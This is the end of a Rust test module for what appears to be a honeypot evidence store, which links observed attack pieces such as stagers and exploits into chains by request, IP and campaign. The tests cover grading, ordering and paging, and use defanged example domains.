        assert_eq!(of_address.len(), 1);
        assert!(of_address[0].key.is_some());
        assert_eq!(of_address[0].title(), "a[.]example[.]org");
        assert_eq!(
            of_address[0].href(),
            Some("/admin/evidence/links/stager/a.example.org")
        );
    }

    #[tokio::test]
    async fn a_request_before_the_next_pass_has_a_chain_of_its_own() {
        let (s, _d) = store().await;
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(chains[0].key, None);
        assert_eq!(one(&chains[0], "Delivery").label, "a[.]example[.]org");
        assert!(!one(&chains[0], "Delivery").joiner, "it ties nothing yet");
    }

    #[tokio::test]
    async fn a_describer_reads_as_the_sources_sharing_it() {
        let (s, _d) = store().await;
        sighted(&s, UPLOADER, "/a", &[RECIPE, EXPLOIT_A]).await;
        sighted(&s, OTHER, "/b", &[RECIPE, EXPLOIT_B, STAGER_A]).await;
        run(&s).await;
        let hash = piece_hash(RECIPE.0, RECIPE.1);
        let chains = s.chains_of(Anchor::Piece(hash)).await.unwrap();
        assert_eq!(chains.len(), 1);
        let c = &chains[0];
        assert_eq!(c.key, None);
        assert_eq!((c.ips, c.sources), (2, 2));
        assert_eq!(stage(c, "Exploit").len(), 2);
        assert!(one(c, "Command").here);
        assert!(!one(c, "Delivery").joiner, "sharing a recipe joins nothing");
        assert_eq!(c.first_seen, T0);
    }

    #[tokio::test]
    async fn the_mark_follows_the_stored_grade() {
        let (s, _d) = store().await;
        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, EXPLOIT_A]).await;
        seen(piece_hash(EXPLOIT_A.0, EXPLOIT_A.1))
            .execute(&s.pool)
            .await
            .unwrap();
        run(&s).await;
        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
        assert_eq!(one(&chains[0], "Delivery").mark, Mark::Claimed);
        assert_eq!(one(&chains[0], "Exploit").mark, Mark::Seen);
    }

    #[tokio::test]
    async fn a_chain_with_nothing_left_is_not_built() {
        let (s, _d) = store().await;
        let (_, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
        run(&s).await;
        campaign(&s, UPLOADER, &[ip]).await;
        // A deleted row took the sighting; the chain row waits for the pass.
        sqlx::query("DELETE FROM piece_sightings")
            .execute(&s.pool)
            .await
            .unwrap();
        assert!(
            s.chains_of(Anchor::Campaign(UPLOADER))
                .await
                .unwrap()
                .is_empty()
        );
        assert!(s.chains_of(Anchor::Ip(ip)).await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn chains_come_newest_first_and_stop_at_the_cap() {
        let (s, _d) = store().await;
        let ip_id = s.upsert_ip(UPLOADER.parse().unwrap()).await.unwrap().id;
        let mut hashes = vec![];
        for i in 0..4 {
            let value = format!("{i}.example.org");
            let h = sight(&s, ("stager", &value, "stager"), ("request", i), ip_id).await;
            let ts = format!("2026-10-0{} 00:00:00", i + 1);
            sqlx::query("UPDATE piece_sightings SET ts = ? WHERE piece = ?")
                .bind(ts)
                .bind(h)
                .execute(&s.pool)
                .await
                .unwrap();
            hashes.push(h);
        }
        run(&s).await;
        let keys: Vec<_> = s.chains_upto(Anchor::Ip(ip_id), 2).await.unwrap();
        let keys: Vec<_> = keys.into_iter().map(|c| c.key.unwrap()).collect();
        assert_eq!(keys, [key_of(hashes[3]), key_of(hashes[2])]);
        let page = s
            .chains_page(
                1,
                ChainFilter {
                    ip: Some(ip_id),
                    ..Default::default()
                },
            )
            .await
            .unwrap();
        assert_eq!(page.items.len(), 4);
        assert_eq!(page.items[0].key, key_of(hashes[3]));
        assert_eq!(page.items[0].payload, Mark::Gap);
        let other = ChainFilter {
            ip: Some(ip_id + 1),
            ..Default::default()
        };
        assert!(s.chains_page(1, other).await.unwrap().items.is_empty());
    }

    #[tokio::test]
    async fn a_put_has_the_name_of_its_path() {
        let (s, _d) = store().await;
        seed_upload(&s, UPLOADER, "/up/put.php", FILE).await;
        sqlx::query("UPDATE uploads SET filename = NULL, ts = ?")
            .bind(T0)
            .execute(&s.pool)
            .await
            .unwrap();
        let at_30 = "2026-10-01 00:00:30";
        let hit = request(&s, UPLOADER, ("GET", "/x/put.php"), 404, "default", at_30).await;
        let key = pass(&s).await;
        let mut c = s.pool.acquire().await.unwrap();
        assert_eq!(ids(dead_ends(&mut c, &key).await.unwrap()), [hit]);
    }
}
